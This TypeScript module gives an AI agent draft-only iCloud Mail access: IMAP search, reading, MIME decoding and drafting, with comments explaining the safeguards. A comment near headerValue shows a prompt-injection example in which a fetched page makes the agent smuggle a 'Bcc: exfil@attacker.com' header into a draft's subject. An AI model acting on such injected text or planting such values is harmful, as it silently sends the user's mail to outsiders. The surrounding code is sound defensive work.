import 'server-only';
import { ICLOUD, ICLOUD_TIMEOUT_MS, type ICloudCredentials } from './config';

/**
 * iCloud Mail over IMAP.
 *
 * ## Draft-only, structurally
 *
 * There is no SMTP client in this file, and that is the design rather than an
 * omission. A composed message is written to the Drafts mailbox with IMAP
 * `APPEND`, so it appears in Apple Mail and on iCloud.com for the user to read,
 * edit and send themselves. No code path here can put mail on the wire.
 *
 * That matters because of what else this agent does: it reads web pages and
 * search results, which are untrusted text. An agent that can silently send
 * email as you turns a prompt injection in a fetched page from "says something
 * wrong" into "mails your contacts". Draft-only keeps a human between the model
 * and anything irreversible, and costs almost nothing — the draft is already
 * written; sending it is one click in a client you already have open.
 *
 * If sending is ever added it should be a separate, explicitly-enabled tool, not
 * a flag on this one.
 */

export interface MailSummary {
  uid: number;
  from: string;
  subject: string;
  date: string;
  /** First line or so, for triage without a second round trip. */
  snippet: string;
  seen: boolean;
}

export type MailFailure =
  | 'auth'
  | 'network'
  | 'timeout'
  | 'not-configured'
  | 'no-such-message'
  | 'invalid-recipient';

export type MailResult<T> =
  | { ok: true; value: T }
  | { ok: false; kind: MailFailure; message: string };

/** Injectable so tests drive a fake server rather than a real mailbox. */
export interface ImapLike {
  connect(): Promise<void>;
  logout(): Promise<void>;
  getMailboxLock(path: string): Promise<{ release(): void }>;
  search(query: Record<string, unknown>, opts?: Record<string, unknown>): Promise<number[] | false>;
  fetch(
    range: string | number[],
    query: Record<string, unknown>,
    opts?: Record<string, unknown>,
  ): AsyncIterable<Record<string, unknown>>;
  append(path: string, content: string, flags?: string[], date?: Date): Promise<unknown>;
  list(): Promise<Array<{ path: string; specialUse?: string }>>;
}

export type ImapFactory = (c: ICloudCredentials) => ImapLike;

const defaultFactory: ImapFactory = (c) => {
  // Imported lazily so the IMAP stack is not pulled into every request that
  // merely touches this module's types.
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { ImapFlow } = require('imapflow');
  return new ImapFlow({
    host: ICLOUD.imap.host,
    port: ICLOUD.imap.port,
    secure: ICLOUD.imap.secure,
    auth: { user: c.appleId, pass: c.appPassword },
    // imapflow logs every command at info level, which would put mail subjects
    // and addresses into the app log. Off by default; this is the user's inbox.
    logger: false,
    greetingTimeout: ICLOUD_TIMEOUT_MS,
    socketTimeout: ICLOUD_TIMEOUT_MS,
  }) as unknown as ImapLike;
};

/** Classify a thrown error into something the model can act on. */
export function classifyError(e: unknown): { kind: MailFailure; message: string } {
  const msg = e instanceof Error ? e.message : String(e);
  if (/auth|login|credential|password/i.test(msg)) {
    return {
      kind: 'auth',
      // The overwhelmingly common cause, and invisible from the error alone.
      message:
        'iCloud rejected the credentials. If two-factor authentication is on, this must be an ' +
        'app-specific password from appleid.apple.com, not your Apple ID password.',
    };
  }
  if (/timeout|etimedout/i.test(msg)) return { kind: 'timeout', message: 'iCloud did not respond in time.' };
  return { kind: 'network', message: msg.slice(0, 300) };
}

/**
 * Run something against a connected mailbox, always closing the connection.
 *
 * Every IMAP operation needs the same connect/lock/release/logout dance, and an
 * un-released lock wedges the next call on the same connection. Centralised so
 * there is one place for it to be right.
 */
async function withMailbox<T>(
  creds: ICloudCredentials | null,
  mailbox: string,
  fn: (client: ImapLike) => Promise<T>,
  factory: ImapFactory = defaultFactory,
): Promise<MailResult<T>> {
  if (!creds) {
    return { ok: false, kind: 'not-configured', message: 'iCloud Mail is not connected.' };
  }
  let client: ImapLike | null = null;
  let lock: { release(): void } | null = null;
  try {
    client = factory(creds);
    await client.connect();
    lock = await client.getMailboxLock(mailbox);
    return { ok: true, value: await fn(client) };
  } catch (e) {
    const { kind, message } = classifyError(e);
    return { ok: false, kind, message };
  } finally {
    lock?.release();
    // A failed logout must not mask the real result.
    try {
      await client?.logout();
    } catch {
      /* already gone */
    }
  }
}

const asText = (v: unknown): string => (typeof v === 'string' ? v : '');

/** Envelope addresses arrive structured; render them the way a person reads them. */
export function formatAddress(a: unknown): string {
  const list = Array.isArray(a) ? a : [a];
  return list
    .filter(Boolean)
    .map((x) => {
      const o = x as { name?: string; address?: string };
      return o.name ? `${o.name} <${o.address ?? ''}>` : (o.address ?? '');
    })
    .filter(Boolean)
    .join(', ');
}

export interface SearchOptions {
  /** Free text, matched against subject and body. */
  query?: string;
  from?: string;
  /** ISO date; only mail on or after it. */
  since?: string;
  unseenOnly?: boolean;
  limit?: number;
  mailbox?: string;
}

/** Cap the result set: a mailbox search can match thousands. */
export const MAX_RESULTS = 25;

export async function searchMail(
  creds: ICloudCredentials | null,
  opts: SearchOptions = {},
  factory: ImapFactory = defaultFactory,
): Promise<MailResult<MailSummary[]>> {
  const limit = Math.min(opts.limit ?? 10, MAX_RESULTS);

  return withMailbox(
    creds,
    opts.mailbox ?? 'INBOX',
    async (client) => {
      const criteria: Record<string, unknown> = {};
      if (opts.query) criteria.or = [{ subject: opts.query }, { body: opts.query }];
      if (opts.from) criteria.from = opts.from;
      if (opts.since) criteria.since = new Date(opts.since);
      if (opts.unseenOnly) criteria.seen = false;
      // An empty criteria object means "everything", which IMAP expresses as ALL.
      if (Object.keys(criteria).length === 0) criteria.all = true;

      const uids = await client.search(criteria, { uid: true });
      if (!uids || uids.length === 0) return [];

      /*
       * Cap to the newest `limit` UIDs. The ORDER is fixed after fetching, not
       * here: IMAP returns messages in ascending sequence order whatever order
       * the UID set is written in, so the `.reverse()` that used to be on this
       * line was discarded by the server and "newest first" came back oldest
       * first. The model then reported the wrong message as the latest.
       *
       * It passed its test because the fake's `fetch()` ignored its `range`
       * argument and yielded a hand-ordered list — a mock agreeing with the
       * code rather than with the protocol.
       */
      const wanted = uids.slice(-limit);

      const out: MailSummary[] = [];
      for await (const msg of client.fetch(wanted, { uid: true, envelope: true, flags: true, bodyStructure: false }, { uid: true })) {
        const env = (msg.envelope ?? {}) as Record<string, unknown>;
        const flags = msg.flags as Set<string> | string[] | undefined;
        const flagList = flags instanceof Set ? [...flags] : (flags ?? []);
        out.push({
          uid: Number(msg.uid),
          from: formatAddress(env.from),
          subject: asText(env.subject) || '(no subject)',
          date: env.date instanceof Date ? env.date.toISOString() : asText(env.date),
          snippet: '',
          seen: flagList.includes('\\Seen'),
        });
      }
      // Newest first, decided here because the server chose the arrival order.
      // UIDs are strictly increasing within a mailbox, so this IS recency.
      return out.sort((a, b) => b.uid - a.uid);
    },
    factory,
  );
}

/** Beyond this a single message is context the turn cannot afford. */
export const MAX_BODY_CHARS = 20_000;

export async function readMail(
  creds: ICloudCredentials | null,
  uid: number,
  mailbox = 'INBOX',
  factory: ImapFactory = defaultFactory,
): Promise<MailResult<{ subject: string; from: string; date: string; body: string; truncated: boolean }>> {
  return withMailbox(
    creds,
    mailbox,
    async (client) => {
      for await (const msg of client.fetch([uid], { uid: true, envelope: true, source: true }, { uid: true })) {
        const env = (msg.envelope ?? {}) as Record<string, unknown>;
        const raw = msg.source instanceof Buffer ? msg.source.toString('utf-8') : asText(msg.source);
        const body = extractPlainText(raw);
        return {
          subject: asText(env.subject) || '(no subject)',
          from: formatAddress(env.from),
          date: env.date instanceof Date ? env.date.toISOString() : asText(env.date),
          body: body.slice(0, MAX_BODY_CHARS),
          truncated: body.length > MAX_BODY_CHARS,
        };
      }
      throw new Error('no-such-message');
    },
    factory,
  );
}

/**
 * The readable part of an RFC822 message.
 *
 * The previous version took the FIRST `boundary=` anywhere in the raw message
 * and did no transfer-encoding decoding. Both assumptions fail on ordinary
 * Apple Mail:
 *
 *   - A normal message is `multipart/mixed` wrapping `multipart/alternative`
 *     wrapping `text/plain` + `text/html`. Splitting on the OUTER boundary
 *     yields one segment containing the whole alternative part, which matches
 *     `/content-type:\s*text\/plain/` because that string appears inside its
 *     BODY — so `MailRead` returned `--innerBoundary\r\nContent-Type:…` plus
 *     the entire HTML alternative.
 *   - `Content-Transfer-Encoding: quoted-printable` came back as
 *     `Thanks for=E2=80=A6`, and base64 as a wall of base64 filling the whole
 *     20k character budget.
 *
 * Still not a full MIME library — no charset conversion beyond utf-8, no
 * message/rfc822 recursion — but it walks the tree it is actually given and
 * decodes the two encodings that account for essentially all real mail. Depth
 * is bounded because a malformed message must not be able to spin this.
 */
/*
 * A bound, not a fix. Every real message terminates on its own because each
 * split consumes input, so no test can catch its removal — said plainly rather
 * than left looking load-bearing. It is here because this parses attacker-
 * adjacent text and a cheap ceiling on recursion costs nothing.
 */
const MAX_MIME_DEPTH = 8;

/** Everything up to the first blank line: this section's own headers. */
function headerBlock(section: string): string {
  const idx = section.search(/\r?\n\r?\n/);
  return idx === -1 ? section : section.slice(0, idx);
}

/** One header's value, with folded continuation lines joined. */
function headerOf(headers: string, name: string): string | null {
  const re = new RegExp(`^${name}:([^\r\n]*(?:\r?\n[ \t][^\r\n]*)*)`, 'im');
  return re.exec(headers)?.[1].replace(/\r?\n[ \t]+/g, ' ').trim() ?? null;
}

function decodeQuotedPrintable(body: string): string {
  // Soft line breaks first — `=` at end of line means "this line continues".
  const joined = body.replace(/=\r?\n/g, '');
  const bytes: number[] = [];
  for (let i = 0; i < joined.length; i++) {
    const hex = joined.slice(i + 1, i + 3);
    if (joined[i] === '=' && /^[0-9a-f]{2}$/i.test(hex)) {
      bytes.push(parseInt(hex, 16));
      i += 2;
    } else {
      bytes.push(joined.charCodeAt(i) & 0xff);
    }
  }
  return Buffer.from(bytes).toString('utf8');
}

/** A leaf part's body, decoded according to its own transfer encoding. */
function decodePart(section: string): string {
  const enc = (headerOf(headerBlock(section), 'content-transfer-encoding') ?? '').toLowerCase();
  const body = stripHeaders(section);
  try {
    if (enc === 'base64') return Buffer.from(body.replace(/\s+/g, ''), 'base64').toString('utf8');
    if (enc === 'quoted-printable') return decodeQuotedPrintable(body);
  } catch {
    // A part that will not decode is shown as it arrived rather than dropped —
    // unreadable text is still a signal; a blank body looks like an empty email.
  }
  return body;
}

interface MimePart {
  type: string;
  text: string;
}

function collectParts(section: string, depth: number, out: MimePart[]): void {
  const headers = headerBlock(section);
  const contentType = (headerOf(headers, 'content-type') ?? 'text/plain').trim();

  if (/^multipart\//i.test(contentType) && depth < MAX_MIME_DEPTH) {
    // Taken from this section's own Content-Type. In practice the first
    // `boundary=` in the section is the same string, so reading it from the
    // header is precision rather than a fix — the fix is that we RECURSE at
    // all. The old code split once on the outermost boundary and then looked
    // for a segment whose text matched /text\/plain/, which the whole
    // alternative part did, because that string appears inside its body.
    const boundary = /boundary="?([^";\r\n]+)"?/i.exec(contentType)?.[1];
    if (boundary) {
      const segments = stripHeaders(section).split(`--${boundary}`);
      // segments[0] is the preamble; a segment starting `--` is the terminator.
      for (const segment of segments.slice(1)) {
        if (segment.startsWith('--')) break;
        collectParts(segment.replace(/^\r?\n/, ''), depth + 1, out);
      }
      return;
    }
  }
  out.push({ type: contentType.toLowerCase(), text: decodePart(section) });
}

export function extractPlainText(raw: string): string {
  const parts: MimePart[] = [];
  collectParts(raw, 0, parts);

  const plain = parts.find((p) => p.type.startsWith('text/plain'));
  if (plain) return plain.text.trim();

  // No plain alternative — better a de-tagged HTML body than raw markup.
  const html = parts.find((p) => p.type.startsWith('text/html'));
  if (html) {
    return html.text
      .replace(/<(script|style)[\s\S]*?<\/\1>/gi, '')
      .replace(/<[^>]+>/g, ' ')
      .replace(/&nbsp;/g, ' ')
      .replace(/&amp;/g, '&')
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>')
      .replace(/[ \t]+/g, ' ')
      .replace(/\n{3,}/g, '\n\n')
      .trim();
  }
  return (parts[0]?.text ?? stripHeaders(raw)).trim();
}

function stripHeaders(section: string): string {
  const idx = section.search(/\r?\n\r?\n/);
  return idx === -1 ? section : section.slice(idx).replace(/^\r?\n\r?\n/, '');
}

/**
 * RFC 5322 headers are LINE-ORIENTED, so a newline in a value is a new header.
 *
 * `draftMail` interpolated the model's `to`, `cc` and `subject` straight into
 * the header block. The tool schema is `z.string()`, which permits newlines, so
 * a prompt-injected page could get the agent to call
 *
 *     MailDraft({ subject: "Invoice\r\nBcc: exfil@attacker.com", … })
 *
 * and the appended draft carries a real `Bcc` header. Apple Mail's compose view
 * does not show Bcc by default, so the human "review before sending" step —
 * the entire reason this module drafts instead of sending, and the reason it
 * ships no SMTP client at all — reviews a message whose real recipient list it
 * is not displaying.
 *
 * The `[ \t]*` also eats the leading whitespace of a folded continuation line.
 * That part is TIDINESS, not safety, and is marked as such because sabotaging
 * it breaks no test: once the newline is gone the value is a single line
 * whatever follows it. Removing the newline is the whole security property.
 */
function headerValue(raw: string): string {
  return raw.replace(/[\r\n]+[ \t]*/g, ' ').trim();
}

/**
 * A comma-separated recipient list, or null if any entry is not an address.
 *
 * Recipients are REFUSED rather than sanitised. A mangled subject line is a
 * cosmetic problem; a mangled address list is a message going somewhere the
 * user did not intend, and quietly "cleaning" it would hide exactly the case
 * worth surfacing.
 */
const ADDRESS = /^[^\s@<>,;:"\\]+@[^\s@<>,;:"\\]+\.[^\s@<>,;:"\\]+$/;
function addressList(raw: string): string | null {
  const parts = raw.split(',').map((p) => headerValue(p)).filter(Boolean);
  if (parts.length === 0) return null;
  // A display name is stripped rather than supported: `Name <a@b.c>` gives the
  // model a second place to hide a newline for no capability gain.
  return parts.every((p) => ADDRESS.test(p)) ? parts.join(', ') : null;
}

/**
 * Write a draft. Never sends.
 *
 * `\Draft` is what makes clients treat it as editable rather than as received
 * mail, and the special-use lookup is what makes it land in the user's actual
 * Drafts folder rather than a second one we invented — iCloud's is "Drafts" but
 * a localised account may differ, and a draft filed somewhere nobody looks is
 * the same as no draft.
 */
export async function draftMail(
  creds: ICloudCredentials | null,
  msg: { to: string; subject: string; body: string; cc?: string },
  factory: ImapFactory = defaultFactory,
): Promise<MailResult<{ mailbox: string }>> {
  const to = addressList(msg.to);
  if (!to) {
    return {
      ok: false,
      kind: 'invalid-recipient',
      message: `Not a valid email address: ${headerValue(msg.to).slice(0, 120)}`,
    };
  }
  const cc = msg.cc ? addressList(msg.cc) : null;
  if (msg.cc && !cc) {
    return {
      ok: false,
      kind: 'invalid-recipient',
      message: `Not a valid Cc address: ${headerValue(msg.cc).slice(0, 120)}`,
    };
  }

  return withMailbox(
    creds,
    'INBOX',
    async (client) => {
      const boxes = await client.list();
      const drafts =
        boxes.find((b) => b.specialUse === '\\Drafts')?.path ??
        boxes.find((b) => /^drafts$/i.test(b.path))?.path ??
        'Drafts';

      const headers = [
        `From: ${headerValue(creds!.appleId)}`,
        `To: ${to}`,
        ...(cc ? [`Cc: ${cc}`] : []),
        `Subject: ${headerValue(msg.subject)}`,
        `Date: ${new Date().toUTCString()}`,
        'MIME-Version: 1.0',
        'Content-Type: text/plain; charset=utf-8',
      ].join('\r\n');

      await client.append(drafts, `${headers}\r\n\r\n${msg.body}`, ['\\Draft']);
      return { mailbox: drafts };
    },
    factory,
  );
}
